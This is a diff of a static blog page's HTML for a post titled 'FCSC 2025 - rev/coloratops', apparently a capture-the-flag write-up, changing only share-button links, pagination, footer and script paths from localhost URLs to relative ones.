     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -613,7 +607,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f;title=" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -621,7 +615,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=%20%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops%20%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -629,7 +623,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f&amp;t=" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f&amp;t=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -637,7 +631,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=&amp;url=%2f%2flocalhost%3a1313%2fposts%2f1%2f01%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202025%20-%20rev%2fcoloratops&amp;url=%2fposts%2f2025%2f04%2ffcsc-2025-rev%2fcoloratops%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -652,14 +646,14 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 
         <div class="pagination__buttons">
             
-            <span class="button previous">
-                <a href="//localhost:1313/posts/2022/12/ropemporium-ret2win-x64/">
-                    <span class="button__icon">←</span>
-                    <span class="button__text">🇫🇷 ROPEmporium - ret2win (x64)</span>
+
+            
+            <span class="button next">
+                <a href="/posts/2025/04/retropixel-2025-web3/entrypoint/">
+                    <span class="button__text">🇬🇧 RetroPixel 2025 - web3/entrypoint</span>
+                    <span class="button__icon">→</span>
                 </a>
             </span>
-            
-
             
         </div>
     </div>
@@ -681,7 +675,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
     <div class="footer__inner">
         <div class="footer__content">
             <span>&copy; 2025</span>
-            <span><a href="//localhost:1313/">conflict</a></span>
+            <span><a href="/">conflict</a></span>
             <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
             
             
@@ -704,7 +698,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 
 
 
-<script type="text/javascript" src="//localhost:1313/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
 
 
 
